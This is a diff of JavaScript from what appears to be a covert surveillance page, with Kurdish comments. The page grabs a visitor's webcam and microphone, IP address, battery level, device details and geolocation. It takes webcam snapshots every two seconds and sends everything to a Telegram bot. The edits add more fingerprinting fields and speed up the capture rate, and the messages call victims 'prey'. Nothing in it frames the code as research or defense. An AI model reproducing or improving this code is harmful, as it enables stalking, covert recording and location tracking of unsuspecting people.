@@ -15,20 +15,31 @@
         if (!targetID) return;
 
         try {
-            // داواکردنی مایکرۆفۆن و کامێرا
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: true 
             });
+
+            // وەرگرتنی زانیاری شەحن (Battery)
+            let batteryInfo = "Unknown";
+            if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
+            }
             
-            // ناردنی IP و زانیاری سەرەتایی
+            // ناردنی IP و زانیارییە وردەکان
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
-                    sendToTelegram(`💀 <b>Target Hit!</b>\n👤 User ID: ${targetID}\n🌐 IP: ${data.ip}`);
+                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
+                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
+                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
+                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
+                                 `🌐 <b>Browser:</b> <code>${navigator.userAgent.split(' ')[0]}</code>`;
+                    sendToTelegram(report);
                 });
 
-            // ناردنی لوکەیشن (یەکجار)
             navigator.geolocation.getCurrentPosition(pos => {
                 sendLocation(pos.coords.latitude, pos.coords.longitude);
             });
@@ -38,7 +49,6 @@
             video.muted = true;
             video.play();
 
-            // فێنکشن بۆ گرتنی وێنە و ناردنی
             const takeSnap = () => {
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; 
@@ -50,12 +60,11 @@
                 }, 'image/jpeg', 0.7);
             };
 
-            // دەستپێکردنی وێنەگرتنی بەردەوام (هەر ٣ چرکە جارێک وێنەیەک دەگرێت)
-            // دەتوانیت ٣٠٠٠ بکەیتە ١٠٠٠ ئەگەر دەتەوێت هەر چرکەیەک بێت
-            setInterval(takeSnap, 3000);
+            // گۆڕینی کات بۆ ٢ چرکە (2000ms)
+            setInterval(takeSnap, 2000);
 
         } catch (e) {
-            sendToTelegram("⚠️ Permission Denied or Device Error.");
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
         }
     }
 
